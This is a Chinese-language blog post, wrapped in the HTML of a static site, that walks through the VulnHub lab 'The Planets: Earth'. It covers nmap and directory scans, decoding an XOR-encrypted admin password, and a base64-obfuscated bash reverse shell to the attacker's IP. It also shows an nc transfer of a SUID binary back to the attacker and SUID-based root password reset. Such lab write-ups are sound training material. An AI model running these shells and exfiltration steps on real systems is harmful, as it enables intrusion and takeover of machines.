@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="St3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="上个礼拜打了ciscn的半决赛，混了一个国三，和奖金擦肩而过,唉~~。比赛的流程也从原来的纯awdp到上午awdp下午渗透赛了，学了这么久才发现一次靶机都没打过，导致渗透测试直接傻眼了，搞了半天都没搞出来，现在在vulnhub上面好好学习恶补一下  The Planet:Earth 访问靶场，看见404 {:height 433, :width 705} 吓得我直接去官网看了一眼，说就是这个页面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The_Planets:Earth">
+<meta property="og:url" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/index.html">
+<meta property="og:site_name" content="St3r&#39;s Blog">
+<meta property="og:description" content="上个礼拜打了ciscn的半决赛，混了一个国三，和奖金擦肩而过,唉~~。比赛的流程也从原来的纯awdp到上午awdp下午渗透赛了，学了这么久才发现一次靶机都没打过，导致渗透测试直接傻眼了，搞了半天都没搞出来，现在在vulnhub上面好好学习恶补一下  The Planet:Earth 访问靶场，看见404 {:height 433, :width 705} 吓得我直接去官网看了一眼，说就是这个页面">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742625187964_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742626512732_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742626948802_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742626996348_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627134949_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627187106_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627418197_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627644513_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627724885_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627928854_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742627970362_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628056738_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628137395_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628213724_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628282992_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628644853_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628784996_0.png">
+<meta property="og:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742628839678_0.png">
+<meta property="article:published_time" content="2025-03-22T08:40:41.000Z">
+<meta property="article:modified_time" content="2025-03-22T08:42:19.070Z">
+<meta property="article:author" content="St3r">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://st3r665.github.io/2025/03/22/The-Planets-Earth/assets/image_1742625187964_0.png">
+  
+  
+  
+  <title>The_Planets:Earth - St3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"st3r665.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cffMsCRnQgVg41fT6r4UVhsn-gzGzoHsz","app_key":"7fJmz4elucAMMsKGIgyYKPjw","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>St3r&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="The_Planets:Earth"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-22 16:40" pubdate>
+          2025年3月22日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">The_Planets:Earth</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <ul>
+<li><strong>上个礼拜打了ciscn的半决赛，混了一个国三，和奖金擦肩而过,唉~~。比赛的流程也从原来的纯awdp到上午awdp下午渗透赛了，学了这么久才发现一次靶机都没打过，导致渗透测试直接傻眼了，搞了半天都没搞出来，现在在vulnhub上面好好学习恶补一下</strong></li>
+<li></li>
+<li><h2 id="The-Planet-Earth"><a href="#The-Planet-Earth" class="headerlink" title="The Planet:Earth"></a>The Planet:Earth</h2><ul>
+<li>访问靶场，看见404</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742625187964_0.png" srcset="/img/loading.gif" lazyload alt="image.png">{:height 433, :width 705}</li>
+<li>吓得我直接去官网看了一眼，说就是这个页面，才放心的继续渗透。</li>
+<li>先用nmap扫一下</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -sC -p- 192.168.56.135<br><br>(<span class="hljs-built_in">test</span>) ┌──(root㉿kali)-[/home/kali]<br>└─# nmap -sV -sC -p- 192.168.56.135<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 14:56 CST<br>Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 20.70% <span class="hljs-keyword">done</span>; ETC: 14:59 (0:02:18 remaining)<br>Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 37.10% <span class="hljs-keyword">done</span>; ETC: 14:59 (0:01:43 remaining)<br>Stats: 0:01:33 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 59.49% <span class="hljs-keyword">done</span>; ETC: 14:59 (0:01:03 remaining)<br>Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 95.86% <span class="hljs-keyword">done</span>; ETC: 14:59 (0:00:06 remaining)<br>Stats: 0:02:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 95.83% <span class="hljs-keyword">done</span>; ETC: 14:59 (0:00:00 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> earth.local (192.168.56.135)<br>Host is up (0.00067s latency).<br>Not shown: 65381 filtered tcp ports (no-response), 151 filtered tcp ports (admin-prohibited)<br>PORT    STATE SERVICE  VERSION<br>22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:<span class="hljs-built_in">df</span>:be:e9:a8 (ECDSA)<br>|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)<br>80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>l mod_wsgi/<span class="hljs-number">4.7</span>.<span class="hljs-number">1</span> Python/<span class="hljs-number">3.9</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">51</span> (Fedora) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>l mod_wsgi/<span class="hljs-number">4.7</span>.<span class="hljs-number">1</span> Python/<span class="hljs-number">3.9</span><br>|_http-title: Earth Secure Messaging<br><span class="hljs-number">443</span>/tcp open  ssl/http Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">51</span> ((Fedora) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>l mod_wsgi/<span class="hljs-number">4.7</span>.<span class="hljs-number">1</span> Python/<span class="hljs-number">3.9</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">51</span> (Fedora) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>l mod_wsgi/<span class="hljs-number">4.7</span>.<span class="hljs-number">1</span> Python/<span class="hljs-number">3.9</span><br>|_http-title: Earth Secure Messaging<br>| tls-alpn: <br>|_  http/<span class="hljs-number">1.1</span><br>|_ssl-date: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space<br>| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local<br>| Not valid before: <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">12</span>T23:<span class="hljs-number">26</span>:<span class="hljs-number">31</span><br>|_Not valid after:  <span class="hljs-number">2031</span>-<span class="hljs-number">10</span>-<span class="hljs-number">10</span>T23:<span class="hljs-number">26</span>:<span class="hljs-number">31</span><br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">37</span>:<span class="hljs-number">0</span>C:F8 (VMware)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">159.84</span> seconds<br><br></code></pre></td></tr></table></figure></li>
+<li>有一个web服务，一个ssh服务和一个443服务，暂时不知道有什么用，再扫一下目录</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742626512732_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>443服务</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.56.135<br><br>(<span class="hljs-built_in">test</span>) ┌──(root㉿kali)-[/home/kali]<br>└─# dirsearch -u http://192.168.56.135<br><br>  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                            <br> (_||| _) (/_(_|| (_| )                                                                                           <br>                                                                                                                  <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/reports/http_192.168.56.135/_25-03-22_14-54-00.txt<br><br>Target: http://192.168.56.135/<br><br>[14:54:00] Starting:                                                                                              <br>[14:54:24] 403 -  199B  - /cgi-bin/                                         <br>[14:54:24] 404 -  196B  - /cgi-bin/a1stats/a1disp.cgi                       <br>[14:54:24] 404 -  196B  - /cgi-bin/awstats.pl                               <br>[14:54:24] 404 -  196B  - /cgi-bin/awstats/<br>[14:54:24] 404 -  196B  - /cgi-bin/htimage.exe?2,2<br>[14:54:24] 404 -  196B  - /cgi-bin/htmlscript                               <br>[14:54:24] 404 -  196B  - /cgi-bin/imagemap.exe?2,2<br>[14:54:24] 404 -  196B  - /cgi-bin/index.html<br>[14:54:24] 404 -  196B  - /cgi-bin/login                                    <br>[14:54:24] 404 -  196B  - /cgi-bin/login.cgi<br>[14:54:24] 404 -  196B  - /cgi-bin/login.php<br>[14:54:24] 404 -  196B  - /cgi-bin/mt-xmlrpc.cgi<br>[14:54:24] 404 -  196B  - /cgi-bin/mt.cgi<br>[14:54:24] 404 -  196B  - /cgi-bin/mt/mt-xmlrpc.cgi<br>[14:54:24] 404 -  196B  - /cgi-bin/mt/mt.cgi                                <br>[14:54:24] 404 -  196B  - /cgi-bin/php.ini                                  <br>[14:54:24] 404 -  196B  - /cgi-bin/printenv<br>[14:54:24] 404 -  196B  - /cgi-bin/mt7/mt.cgi<br>[14:54:24] 404 -  196B  - /cgi-bin/mt7/mt-xmlrpc.cgi                        <br>[14:54:24] 404 -  196B  - /cgi-bin/printenv.pl<br>[14:54:24] 404 -  196B  - /cgi-bin/test-cgi<br>[14:54:24] 404 -  196B  - /cgi-bin/ViewLog.asp<br>[14:54:24] 404 -  196B  - /cgi-bin/test.cgi<br>[14:54:52] 404 -  196B  - /static/api/swagger.json                          <br>[14:54:52] 404 -  196B  - /static/api/swagger.yaml<br>[14:54:52] 404 -  196B  - /static/dump.sql<br></code></pre></td></tr></table></figure></li>
+<li>好家伙，目录也啥都扫不出来，然后就回头看了一下nmap的结果，发现有一个很重要的点，</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local<br></code></pre></td></tr></table></figure></li>
+<li>这句话的意思，简单来说，就是修改一下&#x2F;etc&#x2F;hosts文件，把ip地址解析成这两个DNS，那就来试一下</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742626948802_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742626996348_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>第一个是一个留言板，暂时先放一边，（其实我一开始是以为有xss的，所以下面的数据多了三个短的），看一下第二个页面，说测试网站，啥都没有，不信，扫一下目录</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627134949_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>扫到一个robots.txt，大部分都是正常的后缀名，最后一个不太正常，就看一眼</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627187106_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>id:: 67de6174-b1d4-4bd7-82e9-0e2abb8603d9<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">测试安全信息传送系统注意事项：<br>*使用 XOR 加密算法，与 RSA 算法一样安全。<br>*地球已确认收到我们发送的信息。<br>*testdata.txt 用于测试加密。<br>*terra 用作管理门户的用户名。<br>待办事项<br>*如何安全地向地球发送每月密钥？还是每周更换一次密钥？<br>*需要测试不同的密钥长度，以防止暴力破解。密钥应该有多长？<br>*需要改进信息传送界面和管理面板的界面，目前的界面非常简陋。<br></code></pre></td></tr></table></figure></li>
+<li>大概知道了，前面的那三行数据应该就是xor加密过后的结果，还有一个testdata.txt用来作为密钥测试数据</li>
+<li>不太明白terra作为登陆用户是什么意思，毕竟没有看到任何一个登陆的页面，那就扫一下第一个页面吧。</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627418197_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>扫到一个登陆界面，用户名就是terra，密码我们来测试一下</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627644513_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>解码出来就是earthclimatechangebad4humans，然后就可以登陆，执行命令</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627724885_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>众所周知，网站的执行命令的权限应该是很低的，所以就需要反弹shell，提权.</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627928854_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyOS81NTY2IDA+JjEK | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure></li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742627970362_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>查看权限，</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628056738_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>反正几乎是啥都干不了，那就提权</li>
+<li>提权是真不太会，只能看大佬的wp，suid提权</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm /4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure></li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628137395_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>看到有一个&#x2F;usr&#x2F;bin&#x2F;reset_root 执行一下</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628213724_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>看到执行失败，又不会了，看佬怎么说</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628282992_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>说是执行可以把root的密码重置成Earth</li>
+<li>那就查看一下这个文件具体的流程，但是靶机上面没有ltrace，那就nc传回kali</li>
+<li>kali上</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 5566 &gt; reset_root<br></code></pre></td></tr></table></figure></li>
+<li>靶机上</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 192.168.56.129 5566 &lt; /usr/bin/reset_root<br></code></pre></td></tr></table></figure></li>
+<li>这样就把文件传回本地</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x reset_root<br><br>ltrac ./reset_root<br><br>(base) ┌──(root㉿kali)-[/home/kali/Downloads]<br>└─# ltrace ./reset_root <br>puts(<span class="hljs-string">&quot;CHECKING IF RESET TRIGGERS PRESE&quot;</span>...CHECKING IF RESET TRIGGERS PRESENT...<br>)            = 38<br>access(<span class="hljs-string">&quot;/dev/shm/kHgTFI5G&quot;</span>, 0)                         = -1<br>access(<span class="hljs-string">&quot;/dev/shm/Zw7bV9U5&quot;</span>, 0)                         = -1<br>access(<span class="hljs-string">&quot;/tmp/kcM0Wewe&quot;</span>, 0)                             = -1<br>puts(<span class="hljs-string">&quot;RESET FAILED, ALL TRIGGERS ARE N&quot;</span>...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.<br>)            = 44<br>+++ exited (status 0) +++<br></code></pre></td></tr></table></figure></li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628644853_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>代表着这三个文件没有被找到，那就在靶机上自己创建</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /dev/shm/kHgTFI5G<br><span class="hljs-built_in">touch</span> /dev/shm/Zw7bV9U5<br><span class="hljs-built_in">touch</span> /tmp/kcM0Wewe<br></code></pre></td></tr></table></figure></li>
+<li>然后再执行</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628784996_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>可以看到，root密码已经被修改，接下来登陆就可以了</li>
+<li><img src="/2025/03/22/The-Planets-Earth/assets/image_1742628839678_0.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+</ul>
+</li>
+<li>不得不说，还得是国外的这个flag的创意棒啊~~</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/vulnhub/" class="print-no-link">#vulnhub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>The_Planets:Earth</div>
+      <div>http://st3r665.github.io/2025/03/22/The-Planets-Earth/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>St3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/12/LD-PRELOAD%E5%8A%AB%E6%8C%81/" title="LD_PRELOAD劫持">
+                        <span class="hidden-mobile">LD_PRELOAD劫持</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
